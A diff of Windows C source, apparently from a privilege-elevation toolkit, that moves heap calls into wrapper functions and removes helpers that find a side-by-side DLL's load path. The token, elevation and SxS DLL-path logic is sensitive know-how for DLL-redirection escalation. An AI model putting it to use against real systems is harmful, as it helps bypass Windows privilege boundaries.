@@ -1356,7 +1472,7 @@ LPWSTR ucmQueryRuntimeInfo(
             GetCommandLine(),
             MB_ICONINFORMATION);
 
-        RtlFreeHeap(hHeap, 0, lpReport);
+        ucmxHeapFree(lpReport);
         lpReport = NULL;
     }
 
@@ -1374,10 +1490,7 @@ LPWSTR ucmQueryRuntimeInfo(
 BOOLEAN ucmDestroyRuntimeInfo(
     _In_ LPWSTR RuntimeInfo)
 {
-    return RtlFreeHeap(
-        NtCurrentPeb()->ProcessHeap,
-        0,
-        RuntimeInfo);
+    return ucmxHeapFree((PVOID)RuntimeInfo);
 }
 
 /*
@@ -1437,7 +1550,6 @@ NTSTATUS ucmIsUserHasInteractiveSid(
 {
     BOOL IsInteractiveSid = FALSE;
     NTSTATUS status = STATUS_UNSUCCESSFUL;
-    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;
     ULONG LengthNeeded = 0;
 
     DWORD i;
@@ -1458,10 +1570,7 @@ NTSTATUS ucmIsUserHasInteractiveSid(
         if (status != STATUS_BUFFER_TOO_SMALL)
             break;
 
-        groupInfo = (PTOKEN_GROUPS)RtlAllocateHeap(
-            hHeap,
-            HEAP_ZERO_MEMORY,
-            LengthNeeded);
+        groupInfo = (PTOKEN_GROUPS)ucmxHeapAlloc(LengthNeeded);
 
         if (groupInfo == NULL)
             break;
@@ -1500,7 +1609,7 @@ NTSTATUS ucmIsUserHasInteractiveSid(
     } while (FALSE);
 
     if (groupInfo != NULL)
-        RtlFreeHeap(hHeap, 0, groupInfo);
+        ucmxHeapFree(groupInfo);
 
     if (pbInteractiveSid)
         *pbInteractiveSid = IsInteractiveSid;
@@ -1528,7 +1637,6 @@ NTSTATUS ucmIsLocalSystem(
 
     NTSTATUS                        status = STATUS_UNSUCCESSFUL;
     HANDLE                          hToken = NULL;
-    HANDLE                          ProcessHeap = NtCurrentPeb()->ProcessHeap;
 
     ULONG                           LengthNeeded = 0;
 
@@ -1552,10 +1660,7 @@ NTSTATUS ucmIsLocalSystem(
 
         if (status == STATUS_BUFFER_TOO_SMALL) {
 
-            ptu = (PTOKEN_USER)RtlAllocateHeap(
-                ProcessHeap,
-                HEAP_ZERO_MEMORY,
-                LengthNeeded);
+            ptu = (PTOKEN_USER)ucmxHeapAlloc(LengthNeeded);
 
             if (ptu) {
 
@@ -1581,7 +1686,7 @@ NTSTATUS ucmIsLocalSystem(
                     }
 
                 }
-                RtlFreeHeap(ProcessHeap, 0, ptu);
+                ucmxHeapFree(ptu);
             }
             else {
                 status = STATUS_INSUFFICIENT_RESOURCES;
@@ -1597,98 +1702,6 @@ NTSTATUS ucmIsLocalSystem(
 }
 
 /*
-* sxsFilePathNoSlash
-*
-* Purpose:
-*
-* same as _filepath except it doesnt return last slash.
-*
-*/
-wchar_t *sxsFilePathNoSlash(
-    _In_ const wchar_t *fname,
-    _In_ wchar_t *fpath
-)
-{
-    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;
-
-    if ((fname == 0) || (fpath == NULL))
-        return 0;
-
-    while (*fname != (wchar_t)0) {
-        if (*fname == '\\')
-            p = (wchar_t *)fname;
-        fname++;
-    }
-
-    while (p0 < p) {
-        *p1 = *p0;
-        p1++;
-        p0++;
-    }
-    *p1 = 0;
-
-    return fpath;
-}
-
-/*
-* sxsFindLoaderEntry
-*
-* Purpose:
-*
-* Return loader entry filename for sxs dll.
-*
-*/
-BOOL sxsFindLoaderEntry(
-    _In_ PSXS_SEARCH_CONTEXT Context
-)
-{
-    NTSTATUS Status;
-    HANDLE hDll = NULL;
-    UNICODE_STRING usDll;
-
-    PLDR_DATA_TABLE_ENTRY LdrTableEntry = NULL;
-
-    RtlInitUnicodeString(&usDll, Context->DllName);
-
-    Status = LdrGetDllHandle(
-        NULL,
-        NULL,
-        &usDll,
-        &hDll);
-
-    if (NT_SUCCESS(Status)) {
-
-        Status = LdrFindEntryForAddress(
-            hDll,
-            &LdrTableEntry);
-
-        if (NT_SUCCESS(Status)) {
-
-            if (_strstri(
-                LdrTableEntry->FullDllName.Buffer,
-                L".local") == NULL)
-            {
-                if (_strstri(
-                    LdrTableEntry->FullDllName.Buffer,
-                    Context->SxsKey))
-                {
-                    sxsFilePathNoSlash(
-                        LdrTableEntry->FullDllName.Buffer,
-                        Context->FullDllPath);
-
-                }
-                else
-                    Status = STATUS_NOT_FOUND;
-            }
-            else
-                Status = STATUS_TOO_LATE;
-        }
-    }
-
-    return NT_SUCCESS(Status);
-}
-
-/*
 * ucmGetProcessElevationType
 *
 * Purpose:
@@ -1698,7 +1711,7 @@ BOOL sxsFindLoaderEntry(
 */
 BOOL ucmGetProcessElevationType(
     _In_opt_ HANDLE ProcessHandle,
-    _Out_ TOKEN_ELEVATION_TYPE *lpType
+    _Out_ TOKEN_ELEVATION_TYPE * lpType
 )
 {
     HANDLE hToken = NULL, processHandle = ProcessHandle;
